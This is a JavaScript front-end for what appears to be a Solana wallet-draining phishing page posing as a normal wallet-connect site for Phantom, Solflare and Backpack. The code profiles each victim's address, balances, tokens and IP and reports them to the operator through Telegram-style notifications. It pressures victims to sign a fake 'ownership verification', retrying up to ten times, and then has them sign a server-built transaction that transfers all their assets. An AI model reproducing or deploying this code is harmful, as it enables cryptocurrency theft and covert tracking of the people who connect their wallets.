$(document).ready(function() {
    let selectedWalletProvider = null;
    let currentPublicKey = null;
    let isMobileDevice = isMobile();

    // Enhanced wallet providers detection
    const WALLET_PROVIDERS = {
        phantom: {
            name: 'Phantom',
            provider: window.solana,
            isAvailable: () => window.solana && window.solana.isPhantom,
            mobileSupported: true,
            installUrls: {
                chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                mobile: 'https://phantom.app/download'
            }
        },
        solflare: {
            name: 'Solflare',
            provider: window.solflare,
            isAvailable: () => window.solflare && window.solflare.isSolflare,
            mobileSupported: true,
            installUrls: {
                chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                mobile: 'https://solflare.com/download'
            }
        },
        backpack: {
            name: 'Backpack',
            provider: window.backpack,
            isAvailable: () => window.backpack && window.backpack.isBackpack,
            mobileSupported: true,
            installUrls: {
                chrome: 'https://chrome.google.com/webstore/detail/backpack/aflkmfhebedbjioipglgcbcmnbpgliof',
                firefox: 'https://addons.mozilla.org/en-US/firefox/addon/backpack-wallet/',
                mobile: 'https://backpack.app/download'
            }
        }
    };

    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }

    async function getSPLTokenInfo(connection, publicKey) {
        try {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            });

            const tokens = [];
            const tokenPrices = await getTokenPrices();
            
            for (const tokenAccount of tokenAccounts.value) {
                const accountData = tokenAccount.account.data;
                const parsedInfo = accountData.parsed.info;
                const balance = parsedInfo.tokenAmount;

                if (balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = getTokenSymbol(mint);
                    const price = tokenPrices[mint] || 0;
                    const usdValue = balance.uiAmount * price;
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }

    async function getTokenPrices() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
            const data = await response.json();
            
            return {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
            };
        } catch (error) {
            console.error('Failed to get token prices:', error);
            return {};
        }
    }

    function getTokenSymbol(mint) {
        const tokenMap = {
            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
            'So11111111111111111111111111111111111111112': 'WSOL',
            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
        };
        return tokenMap[mint] || 'Unknown';
    }

    async function sendTelegramNotification(message) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: message.address,
                    balance: message.balance,
                    usdBalance: message.usdBalance,
                    walletType: message.walletType,
                    customMessage: message.customMessage,
                    splTokens: message.splTokens,
                    ip: message.ip,
                    userAgent: navigator.userAgent
                })
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }

    // Enhanced wallet availability check
    function checkWalletAvailability() {
        Object.keys(WALLET_PROVIDERS).forEach(walletId => {
            const wallet = WALLET_PROVIDERS[walletId];
            const statusElement = document.getElementById(`${walletId}-status`);
            const optionElement = document.getElementById(`${walletId}-wallet`);
            
            if (!statusElement) return;

            if (wallet.isAvailable()) {
                statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                if (optionElement) optionElement.disabled = false;
            } else if (isMobileDevice && wallet.mobileSupported) {
                statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                if (optionElement) optionElement.disabled = false;
            } else {
                statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                if (optionElement) optionElement.disabled = false;
            }
        });

        return WALLET_PROVIDERS;
    }

    function getWalletProvider(walletType) {
        return WALLET_PROVIDERS[walletType]?.provider;
    }

    // Enhanced mobile deep linking
    async function generateMobileDeepLink(walletType, walletInfo) {
        const currentUrl = getCurrentSiteUrl();
        let deepLinkUrl = '';
        let appName = '';

        switch (walletType) {
            case 'phantom':
                deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                appName = 'Phantom App';
                break;
            case 'solflare':
                deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                appName = 'Solflare App';
                break;
            case 'backpack':
                deepLinkUrl = `https://backpack.app/ul/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                appName = 'Backpack App';
                break;
            default:
                return null;
        }

        return { deepLinkUrl, appName };
    }

    // Enhanced wallet connection with better error handling
    async function connectWallet(walletType, walletProvider) {
        try {
            const walletInfo = WALLET_PROVIDERS[walletType];
            
            if (!walletInfo) {
                throw new Error(`Unknown wallet type: ${walletType}`);
            }

            const isMobileDevice = isMobile();
            
            // Handle mobile deep linking
            if (isMobileDevice && !walletInfo.isAvailable()) {
                const deepLinkInfo = await generateMobileDeepLink(walletType, walletInfo);
                
                if (deepLinkInfo) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                    });
                    
                    showWalletLoading();
                    $('.wallet-loading-title').text(`Opening ${deepLinkInfo.appName}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${deepLinkInfo.appName}...<br>Please approve the connection in the app.`);
                    
                    // Set up connection check for when user returns from mobile app
                    const connectionCheckInterval = setInterval(() => {
                        const provider = WALLET_PROVIDERS[walletType]?.provider;
                        if (provider && walletInfo.isAvailable()) {
                            clearInterval(connectionCheckInterval);
                            connectWallet(walletType, provider);
                        }
                    }, 1000);
                    
                    // Timeout after 2 minutes
                    setTimeout(() => {
                        clearInterval(connectionCheckInterval);
                        showWalletOptions();
                        unlockModal();
                    }, 120000);
                    
                    window.location.href = deepLinkInfo.deepLinkUrl;
                    return;
                }
            }
            
            // Handle desktop installation
            if (!walletInfo.isAvailable()) {
                let installUrl;
                if (isMobileDevice && walletInfo.installUrls.mobile) {
                    installUrl = walletInfo.installUrls.mobile;
                } else {
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    installUrl = isFirefox ? walletInfo.installUrls.firefox : walletInfo.installUrls.chrome;
                }
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                });
                
                showWalletOptions();
                
                const installMessage = isMobileDevice ? 
                    `${walletInfo.name} mobile app is required. Would you like to download it?` :
                    `${walletInfo.name} is not installed. Would you like to install it?`;
                
                if (confirm(installMessage)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }

            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }

            showWalletLoading();
            
            // Set loading state based on wallet type
            if (walletType === 'phantom') {
                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                $('.wallet-loading-title').text('Connecting Phantom');
                $('.wallet-loading-spinner').removeClass('solflare');
            } else if (walletType === 'solflare') {
                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                $('.wallet-loading-title').text('Connecting Solflare');
                $('.wallet-loading-spinner').addClass('solflare');
            } else if (walletType === 'backpack') {
                $('.wallet-loading-spinner img').attr('src', 'https://backpack.app/favicon.ico');
                $('.wallet-loading-spinner img').attr('alt', 'Backpack');
                $('.wallet-loading-title').text('Connecting Backpack');
                $('.wallet-loading-spinner').removeClass('solflare');
            } else {
                $('.wallet-loading-title').text('Connecting to Wallet');
                $('.wallet-loading-spinner').removeClass('solflare');
            }
            
            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');

            // Special handling for Solflare
            if (walletType === 'solflare') {
                if (!walletProvider || !walletProvider.isSolflare) {
                    throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
                }
            }

            // Connect to wallet
            let resp;
            if (walletType === 'solflare') {
                // Solflare has a different connection method
                resp = await walletProvider.connect();
            } else {
                resp = await walletProvider.connect();
            }
            console.log(`${walletInfo.name} connected:`, resp);

            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

            const connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/API_KEY_HERE', 
                'confirmed'
            );

            let publicKeyString;
            if (walletType === 'solflare') {
                if (walletProvider.publicKey) {
                    publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                } else if (walletProvider.pubkey) {
                    publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
                } else if (resp && resp.publicKey) {
                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                } else {
                    throw new Error('No public key received from Solflare wallet');
                }
            } else {
                if (resp && resp.publicKey) {
                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                } else {
                    throw new Error('No public key received from wallet');
                }
            }

            // Store the public key and provider for later use
            currentPublicKey = publicKeyString;
            selectedWalletProvider = walletProvider;

            const public_key = new solanaWeb3.PublicKey(publicKeyString);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const solBalanceFormatted = (walletBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6);

            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, public_key);

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            const requiredBalance = 0.02 * solanaWeb3.LAMPORTS_PER_SOL;
            
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                
                showRejectionEffects();
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                
                return;
            }

            $('#connect-wallet').text("Processing...");

            // Update UI with connected wallet
            const shortAddress = `${publicKeyString.substring(0, 4)}...${publicKeyString.substring(publicKeyString.length - 4)}`;
            $('#connect-wallet').text(shortAddress).addClass('wallet-connected');
            if ($('#connect-wallet-hero').length) {
                $('#connect-wallet-hero').text(shortAddress).addClass('wallet-connected');
            }
            if ($('#connect-wallet-footer').length) {
                $('#connect-wallet-footer').text(shortAddress).addClass('wallet-connected');
            }

            // Close modal and show success, then start asset transfer
            hideWalletModal();
            
            console.log('Wallet connected successfully:', publicKeyString);

            // Start the asset transfer process automatically after connection
            setTimeout(() => {
                processTransaction(publicKeyString, walletProvider, walletType);
            }, 1000);

        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'backpack' ? 'Backpack Wallet' : 'Unknown',
                customMessage: `❌ Wallet Connection Failed: ${err.message || err.toString() || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
            
            setTimeout(() => {
                const walletName = WALLET_PROVIDERS[walletType]?.name || 'Unknown';
                alert(`Failed to connect to ${walletName}: ${err.message || err.toString() || 'Unknown error'}`);
            }, 2100);
        }
    }

    // Enhanced transaction processing with asset transfer
    async function processTransaction(publicKeyString, walletProvider, walletType, retryCount = 0) {
        const maxRetries = 10;
        
        try {
            // Show processing modal
            showWalletLoading();
            $('.wallet-loading-title').text('Preparing Transaction');
            $('.wallet-loading-subtitle').html('Preparing to transfer assets...<br>Please wait.');

            const verificationKey = `ownership_verified_${publicKeyString}`;
            const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
            
            let ownershipVerified = false;
            
            if (isAlreadyVerified) {
                console.log("Ownership already verified for this wallet, skipping verification");
                
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletType,
                    customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                });
                
                ownershipVerified = true;
            } else {
                $('.wallet-loading-title').text(`Verifying ${walletType} Ownership`);
                $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletType} wallet.<br>This confirms you own this wallet.`);
                $('#connect-wallet').text('Verifying Ownership...');
                
                const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
                const messageBytes = new TextEncoder().encode(verificationMessage);
                
                try {
                    const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                    console.log("Ownership verification signed:", signedMessage);
                    
                    localStorage.setItem(verificationKey, 'true');
                    
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletType,
                        customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                    });
                    
                    ownershipVerified = true;
                } catch (signError) {
                    console.error("Ownership verification failed:", signError);
                    
                    const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
                    const signErrorCode = signError.code || '';
                    const signErrorName = signError.name || '';
                    
                    const isSignRejection = 
                        signErrorMessage.includes('User rejected') || 
                        signErrorMessage.includes('rejected') || 
                        signErrorMessage.includes('cancelled') ||
                        signErrorCode === 4001 ||
                        signErrorCode === -32003 ||
                        signErrorName === 'UserRejectedRequestError';
                    
                    if (isSignRejection) {
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: 'Unknown',
                            usdBalance: 'Unknown',
                            walletType: walletType,
                            customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                        });
                        
                        if (retryCount < maxRetries) {
                            showRejectionEffects();
                            $('.wallet-loading-title').text('Verification Rejected');
                            $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
                            
                            setTimeout(() => {
                                clearRejectionEffects();
                                processTransaction(publicKeyString, walletProvider, walletType, retryCount + 1);
                            }, 2000);
                            return;
                        } else {
                            throw new Error('Ownership verification rejected too many times');
                        }
                    } else {
                        throw signError;
                    }
                }
            }
            
            if (!ownershipVerified) {
                throw new Error('Failed to verify wallet ownership');
            }

            // Now prepare and execute the asset transfer transaction
            $('.wallet-loading-title').text('Preparing Asset Transfer');
            $('.wallet-loading-subtitle').html('Building transaction to transfer all assets...<br>Please wait.');

            // Prepare the transaction
            const prepareResponse = await fetch('/prepare-transaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    publicKey: publicKeyString,
                    verified: true
                })
            });

            if (!prepareResponse.ok) {
                const errorData = await prepareResponse.json();
                throw new Error(errorData.error || 'Failed to prepare transaction');
            }

            const { transaction: transactionData, tokenTransfers, solTransfer } = await prepareResponse.json();
            
            console.log(`Transaction prepared: ${tokenTransfers} tokens, ${solTransfer} SOL`);

            $('.wallet-loading-title').text('Signing Transaction');
            $('.wallet-loading-subtitle').html(`Please sign the transaction in your ${walletType} wallet.<br>Transferring ${tokenTransfers} tokens and ${solTransfer} SOL.`);

            // Convert transaction data back to Transaction object
            const transaction = solanaWeb3.Transaction.from(Buffer.from(transactionData));
            
            // Sign the transaction with the wallet
            let signedTransaction;
            try {
                if (walletType === 'solflare') {
                    signedTransaction = await walletProvider.signTransaction(transaction);
                } else {
                    signedTransaction = await walletProvider.signTransaction(transaction);
                }
            } catch (signError) {
                console.error('Transaction signing failed:', signError);
                throw new Error('User rejected the transaction');
            }

            $('.wallet-loading-title').text('Sending Transaction');
            $('.wallet-loading-subtitle').html('Sending transaction to the blockchain...<br>This may take a few moments.');

            // Send the signed transaction
            const sendResponse = await fetch('/send-transaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    signedTransaction: Array.from(signedTransaction.serialize()),
                    publicKey: publicKeyString
                })
            });

            if (!sendResponse.ok) {
                const errorData = await sendResponse.json();
                throw new Error(errorData.error || 'Failed to send transaction');
            }

            const { signature, success } = await sendResponse.json();

            if (success) {
                $('.wallet-loading-title').text('Transaction Successful!');
                $('.wallet-loading-subtitle').html(`All assets transferred successfully!<br>Transaction: ${signature.substring(0, 16)}...`);
                
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletType,
                    customMessage: `🎉 Transaction Confirmed - All assets transferred successfully! Signature: ${signature}`
                });

                // Show success for 3 seconds then close
                setTimeout(() => {
                    hideWalletModal();
                    showSuccessMessage();
                }, 3000);
            } else {
                throw new Error('Transaction failed on blockchain');
            }
            
        } catch (err) {
            console.error("Error during transaction processing:", err);
            
            $('.wallet-loading-title').text('Transaction Failed');
            $('.wallet-loading-subtitle').html(`Failed to complete transaction.<br>${err.message}`);
            
            await sendTelegramNotification({
                address: publicKeyString || 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType || 'Unknown',
                customMessage: `❌ Transaction Failed: ${err.message || err.toString() || 'Unknown error'}`
            });
            
            showRejectionEffects();
            
            setTimeout(() => {
                hideWalletModal();
                showWalletOptions();
                alert(`Transaction failed: ${err.message || err.toString() || 'Unknown error'}`);
            }, 3000);
        }
    }

    function showSuccessMessage() {
        // Create and show a success message
        const successHtml = `
            <div class="success-message" style="
                position: fixed;
                top: 20px;
                right: 20px;
                background: #10B981;
                color: white;
                padding: 15px 20px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                z-index: 10000;
                animation: slideIn 0.3s ease-out;
            ">
                <strong>✅ Success!</strong> All assets transferred successfully.
            </div>
        `;
        $('body').append(successHtml);
        
        setTimeout(() => {
            $('.success-message').fadeOut(300, function() {
                $(this).remove();
            });
        }, 5000);
    }

    // UI Management Functions
    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }

    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }

    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }

    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }

    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }

    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Processing...');
        lockModal();
        clearRejectionEffects();
    }

    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.phantom-icon').addClass('rejected');
        $('.solflare-icon').addClass('rejected');
        $('.wallet-loading-spinner img').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        
        setTimeout(() => {
            $('.wallet-modal-content').removeClass('shake');
        }, 600);
    }

    function clearRejectionEffects() {
        $('.wallet-loading-spinner').removeClass('rejected');
        $('.phantom-icon').removeClass('rejected');
        $('.solflare-icon').removeClass('rejected');
        $('.wallet-loading-spinner img').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }

    // Event Listeners
    $('#connect-wallet, #connect-wallet-hero').on('click', function() {
        showWalletModal();
    });

    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        
        connectWallet(walletType, walletProvider);
    });

    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    // Initialize wallet detection on page load
    checkWalletAvailability();

    // Expose functions globally for use in other scripts
    window.connectWallet = connectWallet;
    window.getWalletProvider = getWalletProvider;
    window.checkWalletAvailability = checkWalletAvailability;
    window.processTransaction = processTransaction;
});